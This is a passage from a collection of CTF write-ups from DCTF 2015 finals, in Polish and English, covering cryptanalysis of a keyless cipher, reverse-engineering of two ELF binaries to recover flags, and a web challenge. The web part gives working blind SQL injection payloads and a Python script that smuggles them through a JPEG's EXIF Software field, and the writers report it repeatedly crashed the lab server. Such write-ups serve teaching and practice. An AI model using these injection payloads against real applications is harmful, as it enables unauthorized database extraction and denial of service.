test(KEY_LEN):\n    out = []\n\n    for i in range(len(inp)):\n        new = 1 if (ord(inp[i]) & 0x80) != 0 else 0\n        out.append(new)\n\n    res = ''\n    for i in range(KEY_LEN):\n        bits = out[i::KEY_LEN]\n        bitstr = ''.join(str(x) for x in bits)\n        res += chr(int(bitstr[:8], 2))\n    return res\n```\n\nThis way for key length 21 we got `weplayctfoutofpassion`. We used it in the original javascript script to decode the input ciphertext:\n\n```javascript\nkey = \"weplayctfoutofpassion\";\ninput = '51136f3b763d7d5e5910106d423f0908093931284bc6eda1a4ffa595c390b390ef89a4a08ffb9797a2b797f5af92b7a0aaac9cf2dbf9ccecd5c8b3cbb9fffefa4fcf0c26d761f9145793fb6a44ed048cb92a1c0f420e3af756d66f2d1ee94414ed335f180b34fca1fda4f9698a23287ca9e9acb2e8b7c0216c132c078c93a438217e0927ce1afbcf016fd7cc6b1f8b903ec3c0a19f723ae5c0fa46679ded50d17259f89688a5ff4340784a155d'\nconsole.log(proceed(input, key, 'decrypt'));\n```\n\nWhich gave us:\n\n`Awesome work, you should now have just one left to go unless you selected randomly. I m giving you the flag: 1112fc63b939ab8b22a2b6995ba0be95. Enjoy the rest of the journey!`", "timestamp": "2025-10-21T22:03:19.615621"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-20-dctffinals/crypto400/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-20-dctffinals/crypto400/README.md", "content": "﻿## Crypto 400 (crypto, 400p)\n\n### PL\n\n[ENG](#eng-version)\n\nDostajemy cztery ciphertexty, oraz trzy odpowiadające im plaintexty. W czwartym ciphertexcie znajduje się flaga, i naszym zadaniem jest odzyskać ją:\n\n```python\ninp0 = \"People don't understand computers. Computers are magical boxes that do things. People believe what computers tell them.\"\nout0 = \"a2ccb5e4a4f694bd8a87cec3679d69a87db401a4199006dbb0ccbfe6a7ecc3e4f7b2e426c53fed35f95fe3498d038bebdbadeabce9cdfecf87968776876be12088228041c951730a7a30702e197802372236c03dc443934bef55ee71e03f423f7e213715360c1e060aec10fa7ea57ad36f94069f066c50\".decode(\"hex\")\n\ninp1 = \"There are two types of encryption: one that will prevent your sister from reading your diary and one that will prevent your government.\"\nout1 = \"2e4d3e6d2433102f12514b45ae01ef33f32d9869da5b891177076b3b7f34172d237224ca28da588151f349b023a5335a6a0155014b69557c343e2fd3358a538f3c8330a36ffe8eec999ac69abf94a7acbbe01fe108dd4f96378529b96df397e6e6a2fadeb2919b979b38c131f93aa015b709990d9fecdebafdbbf79ead9d819163867db97bb854\".decode(\"hex\")\n\ninp2 = \"There's an entire flight simulator hidden in every copy of Microsoft Excel 97.\"\nout2 = \"fa99eab9f0e0d1bc8588c6da30cb38ef3aa101bc0989139ab2d2a5e1a0f3d8f9f6efb950b54680489e7dda6da923afcfadcfc99bc8ffd4a9aebbe521dc20f82291358510dc6e147a074846463554\".decode(\"hex\")\n\nout3 = \"b4d0b1b0e5bd8ae7cdcbc4d139cf75b173ad4bfb0787008ff2cdf3bffda783f6fff2a44ba81fd61edf3c853daa65ea9ce99690d586e1dee2e1f7a949a916d50dbd19bc2eab3e50380e0d7a2c1d205a59455fbe0ffa2ea63b9074ce43d11e715d495401235f693e31289b2c8d198158f81ba471b32917644e\".decode('hex')\n\ninp = [inp0, inp1, inp2]\nout = [out0, out1, out2, out3] \n```\n\nNie wiemy w jaki sposób zostały zaszyfrowane te dane, musimy więc uciec sie do kryptoanalizy. Jako podpowiedź, w treści zadania otrzymaliśmy informację że szyfr nie używa żadnego klucza.\n\nPierwszą rzeczą jaką zauważamy, jest bardzo specyficzny rozkład najwyższego bitu wiadomości:\n\n```python\nfor i in range(len(out)):\n    o = out[i]\n    print ''.join('1' if ord(oc)&0x80 != 0 else '0' for oc in o)\n```\n\nCo daje nam w wyniku:\n\n    11111111111101010101010111111111111010101010101111111111111010101010100000000000001010101010100000000000010101010101000\n    000000000000101010101010000000000001010101010100000000000001010101010111111111111101010101010111111111111010101010101111111111110101010\n    111111111111010101010101111111111110101010101011111111111110101010101000000000\n    111111111111010101010101111111111110101010101011111111111110101010101000000000000010101010101000000000000101010101010000\n\nTo bardzo ciekawa informacja - najwyższe bity w każdej wiadomośći są dokładnie takie same (poza drugą wiadomością w której są flipowane).\n\nKolejna ciekawa rzecz którą odkryliśmy - jeśli będziemy xorować pierwszy bajt CT (ciphertextu) z drugim, drugi z trzecim, etc, to dla drugiego i trzeciego wejścia wynik będzie sie zaczynał tak samo:`\n\n```python\nfor o in out:\n    for i in range(20):\n        print ord(o[i]) ^ ord(o[i+1]), \n    print\n```\n\nWynik:\n\n    110 121 81 64 82 98 41 55 13 73 13 164 250 244 193 213 201 181 165 189\n    99 115 83 73 23 35 63 61 67 26 14 235 175 238 220 192 222 181 241 179\n    99 115 83 73 16 49 109 57 13 78 28 234 251 243 215 213 155 160 189 181\n    100 97 1 85 88 55 109 42 6 15 21 232 246 186 196 194 222 230 176 252\n\nDlaczego tak się dzieje? Drugi i trzeci plaintext zaczyna się tak samo (pierwsze pięć bajtów jest identyczne).\n\nAle szósty bajt plaintextu się już różni, tak samo ct[4] ^ ct[5] jest różne dla 2 i 3 ciphertextu.\n\nW tym momencie dokonaliśmy ciekawego spostrzeżenia (albo zgadywania, jak kto woli).\nNazwijmy efekty xorowania kolejnych znaków CT jako xorct (xorct[x] = ct[x] ^ ct[x+1])\n\n```python\nplain2[5] = \" \" = 0x20\nplain3[5] = \"'\" = 0x27\n\nxorct2[5] = 0x17\nxorct3[5] = 0x10\n\nplain2[5] ^ plain3[5] = 7\nxorct2[5] ^ xorct3[5] = 7\n```\n\nOkazuje się że to nie przypadek - ta własność zachodzi dla każdego indeksu.\nMając tak silną zależność między plaintextem i ciphertextem, napisanie dekryptora dla ostatniego ciphertextu jest trywialne.\n\nPodsumowanie pomysłu stojącego za dekryptorem (kod niżej) - bierzemy plaintext1 i odpowiadający mu ciphertext1 (musiemy mieć przykładowe zdekryptowane dane).\nI teraz żeby zdekryptować ciphertext2 (wynik nazwiemy plaintext2), zauważamy że dla każdego indekxu `i` zachodzi\n\n    plain1[i] ^ plain2[i] == xorct1[i] ^ xorct2[i]\n\n(Przypominam, xorct[i] to oznaczenie na ct[i] ^ ct[i+1])\nWięc:\n\n    plain2[i] == xorct1[i] ^ xorct2[i] ^ plain1[i]\n\nNasz oryginalny kod (będący trochę brzydki bo \"bruteforcuje\" bajty, ale napisany na szybko, ale co dziwne - zadziałał od razu):\n\n```python\nfor i in range(len(out0)):\n    for c in range(256):\n        if (ord(out1[i]) ^ ord(out1[i+1])) ^ (ord(out3[i]) ^ ord(out3[i+1])) == ord(inp1[i+1]) ^ c:\n            print chr(c),\n```\n\nŁadniejsza wersja (napisana podczas pisania tego writeupa, dla porządku):\n\n```python\nprint ''.join(chr((ord(out1[i]) ^ ord(out1[i+1])) ^ (ord(out3[i]) ^ ord(out3[i+1])) ^ ord(inp1[i+1])) for i in range(len(out0)))\n```\n\nWynik:\n\n    ow you really are a guru, even if no key was used to make it impossible. Your flag is: c7ddf0e946cc0a5ba09807ce3d33f9a7\n\n### ENG version\n\nWe get four ciphertexts and three corresponding plaintexts. The fourth ciphertext contains the flag and we are supposed to decode it:\n\n```python\ninp0 = \"People don't understand computers. Computers are magical boxes that do things. People believe what computers tell them.\"\nout0 = \"a2ccb5e4a4f694bd8a87cec3679d69a87db401a4199006dbb0ccbfe6a7ecc3e4f7b2e426c53fed35f95fe3498d038bebdbadeabce9cdfecf87968776876be12088228041c951730a7a30702e197802372236c03dc443934bef55ee71e03f423f7e213715360c1e060aec10fa7ea57ad36f94069f066c50\".decode(\"hex\")\n\ninp1 = \"There are two types of encryption: one that will prevent your sister from reading your diary and one that will prevent your government.\"\nout1 = \"2e4d3e6d2433102f12514b45ae01ef33f32d9869da5b891177076b3b7f34172d237224ca28da588151f349b023a5335a6a0155014b69557c343e2fd3358a538f3c8330a36ffe8eec999ac69abf94a7acbbe01fe108dd4f96378529b96df397e6e6a2fadeb2919b979b38c131f93aa015b709990d9fecdebafdbbf79ead9d819163867db97bb854\".decode(\"hex\")\n\ninp2 = \"There's an entire flight simulator hidden in every copy of Microsoft Excel 97.\"\nout2 = \"fa99eab9f0e0d1bc8588c6da30cb38ef3aa101bc0989139ab2d2a5e1a0f3d8f9f6efb950b54680489e7dda6da923afcfadcfc99bc8ffd4a9aebbe521dc20f82291358510dc6e147a074846463554\".decode(\"hex\")\n\nout3 = \"b4d0b1b0e5bd8ae7cdcbc4d139cf75b173ad4bfb0787008ff2cdf3bffda783f6fff2a44ba81fd61edf3c853daa65ea9ce99690d586e1dee2e1f7a949a916d50dbd19bc2eab3e50380e0d7a2c1d205a59455fbe0ffa2ea63b9074ce43d11e715d495401235f693e31289b2c8d198158f81ba471b32917644e\".decode('hex')\n\ninp = [inp0, inp1, inp2]\nout = [out0, out1, out2, out3] \n```\n\nWe don't know how the data were encoded so we need to perform some cryptoanalysis. As a hint in the task there is information that the cipher does not use any key.\n\nFirst thing we notice is that there is a very particular distribution of values in the highest bit of the ciphertexts:\n\n```python\nfor i in range(len(out)):\n    o = out[i]\n    print ''.join('1' if ord(oc)&0x80 != 0 else '0' for oc in o)\n```\n\nWe get:\n\n    11111111111101010101010111111111111010101010101111111111111010101010100000000000001010101010100000000000010101010101000\n    000000000000101010101010000000000001010101010100000000000001010101010111111111111101010101010111111111111010101010101111111111110101010\n    111111111111010101010101111111111110101010101011111111111110101010101000000000\n    111111111111010101010101111111111110101010101011111111111110101010101000000000000010101010101000000000000101010101010000\n\nThis is interesting - the highest bits in every message are identical (or flipped in the second message).\n\nNext interesting find is that if we xor first byte of ciphertext (CT) with second, second with third etc. then for second and third inputs we will get identical results:\n\n```python\nfor o in out:\n    for i in range(20):\n        print ord(o[i]) ^ ord(o[i+1]), \n    print\n```\n\nResult:\n\n    110 121 81 64 82 98 41 55 13 73 13 164 250 244 193 213 201 181 165 189\n    99 115 83 73 23 35 63 61 67 26 14 235 175 238 220 192 222 181 241 179\n    99 115 83 73 16 49 109 57 13 78 28 234 251 243 215 213 155 160 189 181\n    100 97 1 85 88 55 109 42 6 15 21 232 246 186 196 194 222 230 176 252\n\nWhy is that? Second and third plaintexts start exactly the same way (first 5 bytes are identical).\n\nBut sixth byte of plaintext is different and therefore ct[4] ^ ct[5] is different for second and third ciphertext.\n\nAt this point we noticed (or guessed) a very interesting rule.\nLet's define effects of xoring consecutive characters from CT as xorct -> xorct[x] = ct[x] ^ ct[x+1]\n\n```python\nplain2[5] = \" \" = 0x20\nplain3[5] = \"'\" = 0x27\n\nxorct2[5] = 0x17\nxorct3[5] = 0x10\n\nplain2[5] ^ plain3[5] = 7\nxorct2[5] ^ xorct3[5] = 7\n```\n\nIt turns out this is not accidental - this property works for every index.\n\nWith such a strong correlation between plaitnext and ciphertext it becomes trivial to make a decryption algorithm for the last ciphertext.\n\nSummary of the decryption algorithm (code is below) - we take plaintext1 and corresponding ciphertext1 (we need example of decoded data).\nNow to decrypt ciphertext2 (we mark the result as plaintextx2), we notice that for every intex `i` there is:\n\n    plain1[i] ^ plain2[i] == xorct1[i] ^ xorct2[i]\n\n(As a reminder: xorct[i] means ct[i] ^ ct[i+1])\nSo:\n\n    plain2[i] == xorct1[i] ^ xorct2[i] ^ plain1[i]\n\nOur original code (quite messy since it brute-forces bytes, but we were trying to write it fast, interestingly it worked right away):\n\n```python\nfor i in range(len(out0)):\n    for c in range(256):\n        if (ord(out1[i]) ^ ord(out1[i+1])) ^ (ord(out3[i]) ^ ord(out3[i+1])) == ord(inp1[i+1]) ^ c:\n            print chr(c),\n```\n\nPretty version (wrote when preparing this writeup):\n\n```python\nprint ''.join(chr((ord(out1[i]) ^ ord(out1[i+1])) ^ (ord(out3[i]) ^ ord(out3[i+1])) ^ ord(inp1[i+1])) for i in range(len(out0)))\n```\n\nResult:\n\n    ow you really are a guru, even if no key was used to make it impossible. Your flag is: c7ddf0e946cc0a5ba09807ce3d33f9a7\n", "timestamp": "2025-10-21T22:03:19.917146"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-20-dctffinals/re_200_time_is_not_your_friend/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-20-dctffinals/re_200_time_is_not_your_friend/README.md", "content": "﻿## Time is not your friend (re, 200p)\n\n### PL\n\n[ENG](#eng-version)\n\nDostajemy [program](./re200) (elf), do zbadania, i rozpoczynamy analizę działania.\n\nCiekawe w programie jest to, że czyta żadnych plików, ani nie chce nic od użytkownika, ani nie bierze żadnych parametrów z linii poleceń - po prostu sie wykonuje.\n\nTrzon programu opiera się na następującym kodzie:\n\n```c++\nbool test(int a1) {\n  int v3 = a1;\n  int v4 = 0;\n  while (v3) {\n    v1 = clock();\n    sleep(5);\n    v4 += v3 % 10;\n    if (clock() - v1 <= 19) {\n      v3 *= 137;\n    }\n    v3 /= 10;\n  }\n  return v4 == 41;\n}\n\nint getint() {\n  v0 = clock();\n  sleep(5);\n  if (clock() - v0 > 19)\n    result = 49000000;\n  else\n    result = 33000000;\n  return result;\n}\n\nint main() {\n  int v2 = 2;\n  int v4 = 2;\n  while(true) {\n    int i;\n    for ( i = 2; v4 - 1 >= i && v4 % i; ++i );\n    if (i == v4) {\n      v0 = clock();\n      ++v2;\n      sleep(3);\n      if ( clock() - v0 <= 19 )\n      exit(0);\n      if(getint() <= v2 && test(v4)) {\n          printf(\"Well done\\n\", v4);\n          break;\n      }\n    }\n    v4++;\n  }\n}\n```\n\nWidać masę bezsensownego kodu i sleepów. Ale przede wszystkim, co tu się dzieje? Program testuje liczby (w v4) od 2 do nieskończoności, aż znajdzie taką która mu się \"podoba\" (przechodzi dwa testy). Wtedy wypisuje \"well done\". Założyliśmy więć, że v4 jest flagą (całkiem słusznie).\n\nPierwszym naszym krokiem było usunięcie wszystkich sleepów (jako że zachowanie kodu zależy od szybkości w kilku miejscach, zakładamy że poprawna ścieżka to ta gdzie kod wykonuje się długo), żeby przyśpieszyć kod do takiego stanu żeby kiedyś otrzymać v4.\n\n```c++\nbool test(int a1) {\n  int v3 = a1;\n  int v4 = 0;\n  while (v3) {\n    v1 = clock();\n    v4 += v3 % 10;\n    v3 /= 10;\n  }\n  return v4 == 41;\n}\n\nint getint() {\n  return 49000000;\n}\n\nint main() {\n  int v2 = 2;\n  int v4 = 2;\n  while(true) {\n    int i;\n    for ( i = 2; v4 - 1 >= i && v4 % i; ++i );\n    if (i == v4) {\n      ++v2;\n      exit(0);\n      if (getint() <= v2 && test(v4)) {\n          printf(\"DCTF{%d}\\n\", v4);\n          break;\n      }\n    }\n    v4++;\n  }\n}\n```\n\nNastępnie patrzymy na działanie kodu. Po usunięciu sleepów kod robi dalej to co oryginał, ale szybciej. Myślimy więc jak go dalej przyśpieszyć.\n\nNa pewno rzuca się w oczy bezsensowna pętla for w mainie - do czego ona służy? Mając trochę doświadczenia, rozpoznajemy ją jako sprawdzanie czy liczba v4 jest pierwsza.\nInwestujemy więc w pomocniczą funkcję sprawdzaącą to samo, ale znacznie szybciej (da się oczywiście lepiej, ale było i tak wystarczająco dobrze):\n\n```c++\nbool isprime(int number){\n    if(number == 2) return true;\n    if(number % 2 == 0) return false;\n    for(int i=3; (i*i)<=number; i+=2){\n        if(number % i == 0 ) return false;\n    }\n    return true;\n}\n```\n\nKolejnym krokiem było zauważenie, warunek może być spełniony dopiero kiedy v2 > 49000000 - a, jak widać od razu po spojrzeniu na kod - v2 to ilość napotkanych na razie liczb pierwszych.\nZamiast liczyć od zera do 49000000wej liczby pierwszej, możemy od razu podstawić pod v2 wartość 49000000, a pod v4 wartość 961748862 (v2-ta liczba pierwsza - 2, bo taka dokładnie relacja wiązała v2 i v4).\n\nOstateczna wersja funkcji main (całe źródło [znajduje się tu](hack.cpp))\n\n```c++\nint main() {\n    int v2 = 49000000; // ndx liczby pierwszej\n    int v4 = 961748862; // (v2-2)ta liczba pierwsza + 1\n    while(true) {\n        int i;\n        if (isprime(v4)) {\n            v2++;\n            if(getint() <= v2 && test(v4)) {\n                printf(\"DCTF{%d}\\n\", v4);\n                break;\n            }\n        } v4++;\n    }\n}\n```\n\nW tym momencie możemy uruchomić nasz program bezpośrednio i poczekać kilka sekund aż wypluje flagę:\n\n    DCTF{961749023}\n\n\n### ENG version\n\nWe get a [binary](./re200) (elf) to work with and we start with analysis of its behaviour.\n\nAn interesting fact is that this binary does not read any files or input from use, nor does it take any command line parameters - it just executes.\n\nThe core of the program is:\n\n```c++\nbool test(int a1) {\n  int v3 = a1;\n  int v4 = 0;\n  while (v3) {\n    v1 = clock();\n    sleep(5);\n    v4 += v3 % 10;\n    if (clock() - v1 <= 19) {\n      v3 *= 137;\n    }\n    v3 /= 10;\n  }\n  return v4 == 41;\n}\n\nint getint() {\n  v0 = clock();\n  sleep(5);\n  if (clock() - v0 > 19)\n    result = 49000000;\n  else\n    result = 33000000;\n  return result;\n}\n\nint main() {\n  int v2 = 2;\n  int v4 = 2;\n  while(true) {\n    int i;\n    for ( i = 2; v4 - 1 >= i && v4 % i; ++i );\n    if (i == v4) {\n      v0 = clock();\n      ++v2;\n      sleep(3);\n      if ( clock() - v0 <= 19 )\n      exit(0);\n      if(getint() <= v2 && test(v4)) {\n          printf(\"Well done\\n\", v4);\n          break;\n      }\n    }\n    v4++;\n  }\n}\n```\n\nThere is a lot of useless code and sleeps. But most importantly: what does this code do? It tests numbers (in v4) starting from 2 to infinity until it finds a number it `likes` (passes two checks). Then prints `well done`. We assumed that the `v4` is a flag (a good assumption as it turned out).\n\n\nFirst step was to remove all sleeps (however since some parts of the code depend on the execution time, we assume that the correct execution path is the one that code uses when it runs longer) to speed up the code so that we can actually get `v4` in reasonable time.\n\n```c++\nbool test(int a1) {\n  int v3 = a1;\n  int v4 = 0;\n  while (v3) {\n    v1 = clock();\n    v4 += v3 % 10;\n    v3 /= 10;\n  }\n  return v4 == 41;\n}\n\nint getint() {\n  return 49000000;\n}\n\nint main() {\n  int v2 = 2;\n  int v4 = 2;\n  while(true) {\n    int i;\n    for ( i = 2; v4 - 1 >= i && v4 % i; ++i );\n    if (i == v4) {\n      ++v2;\n      exit(0);\n      if (getint() <= v2 && test(v4)) {\n          printf(\"DCTF{%d}\\n\", v4);\n          break;\n      }\n    }\n    v4++;\n  }\n}\n```\n\nThen we look at the code execution. After all sleeps are removed the code is still doing what it was, but now faster. We try to improve it even further.\n\nWe notice a long loop in main - what does it do? With a little experience we recognize it as primarity check for v4. We make a function with the same goal, but much faster (of course we could do it even better, but this was sufficient):\n\n```c++\nbool isprime(int number){\n    if(number == 2) return true;\n    if(number % 2 == 0) return false;\n    for(int i=3; (i*i)<=number; i+=2){\n        if(number % i == 0 ) return false;\n    }\n    return true;\n}\n```\n\nNext step was to notice that the condition can be fulfilled only when v2 > 49000000 and as we see in the code the v2 counts prime numbers seen so far.\nInstead of counting from 0 to 49000000th prime number we can simply put 49000000 as value for v2 and 961748862 for v4 (this is the v2th prime number -2, since this was to relation between v2 and v4).\n\nFinal version of the main function (whole source [is here](hack.cpp))\n\n\n```c++\nint main() {\n    int v2 = 49000000; // prime number index\n    int v4 = 961748862; // (v2-2)th prime number + 1\n    while(true) {\n        int i;\n        if (isprime(v4)) {\n            v2++;\n            if(getint() <= v2 && test(v4)) {\n                printf(\"DCTF{%d}\\n\", v4);\n                break;\n            }\n        } v4++;\n    }\n}\n```\n\nNow we can run the code and wait few seconds to get the flag:\n\n    DCTF{961749023}", "timestamp": "2025-10-21T22:03:20.159226"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-20-dctffinals/re_300_tryharder/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-20-dctffinals/re_300_tryharder/README.md", "content": "﻿## Try Harder (re, 300p)\n\n### PL\n[ENG](#eng-version)\n\nDostajemy [program](./re300) (elf), do zbadania.\n\nW przeciwieństwie do poprzedniego programu tutaj wiemy (czyżby?) od razu co powinniśmy zrobić - podajemy jakiś tekst (flagę) jako parametr w linii poleceń, a program wykonuje kilka sprawdzeń i odpowiada czy flaga jest OK czy nie.\n\nZaczynamy więc analizę testów przeprowadzanych na fladze (od teraz będę używać sformułowań \"flaga\" i \"wprowadzony parametr\" zamiennie), jak leci:\n\n```c++\nif ( argc != 2 || strlen(argv[1]) > 0x64 ) {\n    tryharder(); // wypisanie błędu i zakończenie działania\n}\n```\n\nTest zerowy, sprawdzenie czy flaga nie jest dłuższa niż 0x64 znaki. Oczywiście trywialnie go spełnić (nie podawać dłuższej flagi).\n\n```c++\nbool check_1(char *flag) {\n  int i;\n  for (i = 0; flag[i]; ++i);\n  return i == 37;\n}\n```\n\nTest pierwszy - sprawdzenie czy flaga ma dokładnie 37 znaków długości. Również banalnie go spełnić, starczy podać programowi flagę o odpowiedniej długości.\n\nKolejny test (za dużo kodu jak na prosty koncept) - sprawdza czy flaga matchuje do wzorca `DCTF{[A-Za-z0-9]`.\n\nI trzeci test podobny - dzieli 32 znaki flagi znajdujące się za `DCTF{` na 4bajtowe fragmenty, i każdy z nich matchuje z regexem - każdy 4bajtowy blok musiał pasować do odpowiedniego z tych regexów (w kolejności):\n\n    '^9[0-2]6[4-7]'\n    '^[0-5][0-6][b-c]5'\n    '^0[1-6][1-6][1-6]'\n    '^[6-9]0b0'\n    '^a[0-6]'\n    '^47[e-f]c'\n    '^47[2-f][2-3]'\n    '^5[e-f]8[e-f]'\n\nZaimplementowaliśmy nawet generator wszystkich możliwych flag w pythonie, co okazało sie kompletnie niepotrzebne.\n\nTo był ostatni test - w tym momencie program mówi \"Well done\" po podaniu flagi. Niestety, co nas bardzo zaskoczyło, strona odrzucała dalej naszą flagę.\n\nDopiero po chwili zorientowaliśmy się, że program nie kończy sie od razu po wyjściu z funkcji 'main' - są jeszcze destruktory.\n\nA w destruktorach leżał kod odpowiadający czemuś takiemu:\n\n```c++\nint check(char *s) {\n  signed int i;\n  uint32_t v2_0 = 0;\n  uint64_t v2_1 = 0;\n\n  v2_0 = strlen(s);\n  for ( i = 5; i < v2_0; ++i ) {\n    v2_1 += -3 * s[i] + 36 + (int64_t)(s[i] ^ 0x2FCFBA);\n  }\n  int64_t result = v2_1\n       - 74431661\n       * (((int64_t)((unsigned __int128)((unsigned __int128)8315950649585666743LL * (unsigned __int128)v2_1) >> 64) >> 25) \n        - (v2_1 >> 63));\n  return result == 25830287;\n}\n```\n\nWygląda to na skomplikowane działania, nawet nie próbowaliśmy tutaj nic reversować. Za to po prostu napisaliśmy bruferorcer w C++, który generował możliwe flagi, i sprawdzał dla każdej czy przechodzi ona funkcję 'check'. W ten sposób dość szybko znaleźliśmy \"prawdziwą\" flagę, przyjmowaną przez stronę (która również nie była unikalna):\n\n    DCTF{906400b5011160b0a19f47ec47b35f8f\n\n### ENG version\n\nWe get a [binary](./re300) (elf), do work with.\n\nUnlike in previous task, this time we know (do we really?) what to do from the beginning - we input some text (we assume a flag) as a parameter in command line and the program checks it and tells us if the flag is good or not.\n\nWe start the analysis of the tests that are performed on the flag (from now on I will use `flag` and `input parameter` to name the same thing), as follows:\n\n\n```c++\nif ( argc != 2 || strlen(argv[1]) > 0x64 ) {\n    tryharder(); // print error and exit\n}\n```\n\nTest zero, we check if the flag is not longer than 0x64 characters. Trivial to do (just don't input longer flag).\n\n```c++\nbool check_1(char *flag) {\n  int i;\n  for (i = 0; flag[i]; ++i);\n  return i == 37;\n}\n```\n\nTest one - check if the flag has exactly 37 characters. Easy to fulfill, we just need to input flag with exactly the right length.\n\nNext test (too much code for this simple rule, we just provide the pattern) - check if the flag matches `DCTF{[A-Za-z0-9]`.\n\nThird test is similar - splits 32 characters of the flag that are after `DCTF{` into 4-byte parts and each one of them is matched with a regular expression - each part had to match following pattern (in order):\n\n    '^9[0-2]6[4-7]'\n    '^[0-5][0-6][b-c]5'\n    '^0[1-6][1-6][1-6]'\n    '^[6-9]0b0'\n    '^a[0-6]'\n    '^47[e-f]c'\n    '^47[2-f][2-3]'\n    '^5[e-f]8[e-f]'\n\nWe even implemented a generator for all possible flags in python, which turned out not useful in the end.\n\nThis was the lats test - now the binary was printing `Well done` after we put the flag. Unfortunately, surprisingly for us, the website was rejecting our flag.\n\nAfter a while we realised that the program in fact does not end right after leaving `main` function - there are destructors.\n\nIn the destructors there was a code:\n\n```c++\nint check(char *s) {\n  signed int i;\n  uint32_t v2_0 = 0;\n  uint64_t v2_1 = 0;\n\n  v2_0 = strlen(s);\n  for ( i = 5; i < v2_0; ++i ) {\n    v2_1 += -3 * s[i] + 36 + (int64_t)(s[i] ^ 0x2FCFBA);\n  }\n  int64_t result = v2_1\n       - 74431661\n       * (((int64_t)((unsigned __int128)((unsigned __int128)8315950649585666743LL * (unsigned __int128)v2_1) >> 64) >> 25) \n        - (v2_1 >> 63));\n  return result == 25830287;\n}\n```\n\nThis looks like some complex calculations, so we didn't even try to reverse this. We just wrote a brute-force code in C++ which was generating possible flags and checking this condition on them. This was we found the real flag quite fast (it was still not really unique):\n\n    DCTF{906400b5011160b0a19f47ec47b35f8f", "timestamp": "2025-10-21T22:03:20.447709"}
{"source": "github", "repo": "p4-team/ctf", "file": "2015-11-20-dctffinals/web200/README.md", "url": "https://github.com/p4-team/ctf/blob/master/2015-11-20-dctffinals/web200/README.md", "content": "﻿## Limitless (web, 200p)\n\n### PL\n\n[ENG](#eng-version)\n\nW zadaniu dostajemy link do webowego uploadera plików, oraz informacje, że mamy wyciągnąć jakieś informacje z tabeli `flag`.\nAnaliza uploadera oraz jego działania pozwala zauważyć, że uploader po załadowaniu pliku pobiera z niego dane `exif` a następnie na podstawie pola `exif.primary.Software` wyszukuje w bazie danych oraz wyświetla zdjęcia utworzone tym samym oprogramowaniem.\n\nZastosowaliśmy więc technikę `SQL Injection` poprzez pole exif, za pomocą skryptu:\n\n```python\n    img = pexif.JpegFile.fromFile(\"file.jpg\")\n    img.exif.primary.Software = '\"&&' + sql + '#'\n    img.writeFile('file.jpg')\n```\n\nKtóry dopisywał nasze zapytanie do pliku i przygotowywał je do wykonania. Zapytanie trafiało do klauzuli `where` zaraz za porównaniem ze stringiem. Niestety mieliśmy twarde ograniczenie wynoszące 50 znaków dla tego pola exif, co mocno ograniczało nasze możliwości.\nDodatkowo wykluczona była operacja union a tabela z której dokonywano selekcji miała 0 rekordów.\n\nW związku z tym postanowiliśmy wykorzystać atak `remote timing` na bazę danych wraz z testowaniem pojedyńczych znaków jedynego elementu tabeli flags (gdzie spodziewaliśmy się flagi) - jeśli porównanie symbolu było niepoprawne wykonywaliśmy długo liczący się kod (sleep nie był dostępny). Z racji małej liczby znaków nie mogliśmy użyć funkcji `substring` ani `mid`, musieliśmy opierać się o przesuwające się okno ze znamym fragmentem flagi. Kod sql to:\n\n```sql\nbenchmark(~-((select*from flag)like'%\" + window + \"%'),1)\n```\n\nFunkcja benchmark wykonuje podany kod tyle razy ile wynosi pierwszy argument. W naszym przypadku wartość boolean jest zamieniana na liczbę za pomocą unarnego minusa a następnie bity są negowane. Problem z tym rozwiązaniem polegał na tym, że taki benchmark wykonuje się bardzo (!) długo a w naszym kodzie uruchamiamy go dla każdego nie pasującego symbolu, więc dla każdego zgadywanego znaku pesymistycznie prawie 40 razy.\n\nSkutek był taki, że położyliśmy serwer 5 razy uzyskując raptem 2/3 flagi a organizatorzy postanowili zablokować funkcję benchmark.\n\nNasze drugie podejście wykorzystało inny sposób - logowanie błędów mysql. Użyliśmy zapytania:\n\n```sql\nrlike(if(mid((select*from flag),\"+CHARACTER_INDEX+\",1)='\"+CHARACTER+\"','',1))\n```\n\nDzięki czemu w zależności od spełnienia warunku skrypt wykonywał się poprawnie lub zgłaszał błąd składniowy.\nCały skrypt odzyskujący flagę:\n\n```python\nimport pexif, subprocess\n\n​def execute_sql(sql):\n    img = pexif.JpegFile.fromFile(\"/var/www/html/img.jpg\")\n    img.exif.primary.Software = '\"' + sql + '#'\n    img.writeFile('/var/www/html/imgdest.jpg')\n\treturn subprocess.check_output('curl -s -F submit=1 -F file=@/var/www/html/imgdest.jpg http://10.13.37.3', shell=True)\n\nfor i in range(1, 999):\n    for c in (range(48, 58) + range(65, 91) + range(97, 126)):\n        if 'expression' in execute_sql(\"rlike(if(mid((select*from flag),\"+str(i)+\",1)='\"+chr(c)+\"','',1))\"):\n            print chr(c),\n            break\n```\n\nA jego wynik:\n\n`DCTF{09D5D8300A7ADC45C5D434BB467F2A85}`\n\n### ENG version\n\nIn the task we get a link to a web file upoloader and an information that we need to extract some data from `flag` table.\nAnalysis of the uploader and its behaviour reveals that the uploader, after loading the file, collected `exif` data and then based on `exif.primary.Software` finds and displays other pictures made with the same software.\n\nWe used `SQL Injection` via exif field using script:\n\n```python\n    img = pexif.JpegFile.fromFile(\"file.jpg\")\n    img.exif.primary.Software = '\"&&' + sql + '#'\n    img.writeFile('file.jpg')\n```\n\nThis script was adding the query to the file and preparing it for execution. The query was then placed in `where` clause, right after the comparison with a string. Unfortunately we hade a hard limit of 50 characters for the query, which was a strong limiting factor. On top of that it was impossible to use `union` and the table on which the selection was executed had 0 rows.\n\nTherefore we decided to use `remote timing attack` on the database with testing single character of the sole element of flags table (where we expected to find the flag) - if the condition was not matching we were executing a long running task (sleep was unavailable). Since the characters number limitation we could not use `substring` or `mid` functions and we had to relay on a moving window with known flag prefix/suffix. The SQL code was:\n\n```sql\nbenchmark(~-((select*from flag)like'%\" + window + \"%'),1)\n```\n\nBenchmark function executes given code as many times as stated in the first argunent. In our case boolean is converted to int via unary minus and then bits are negated. The problem was that this benchmark executes really long (!) and in our code we we run it for every non matching symbol, so for any guessed character we might use almost 40 of those processes.\n\nAs a result we crashed the server 5 times and still got only 2/3 of the flag and organisers finally decided to block benchmark function.\n\nOur second attempt was using a different approach - exploiting errors in mysql. We 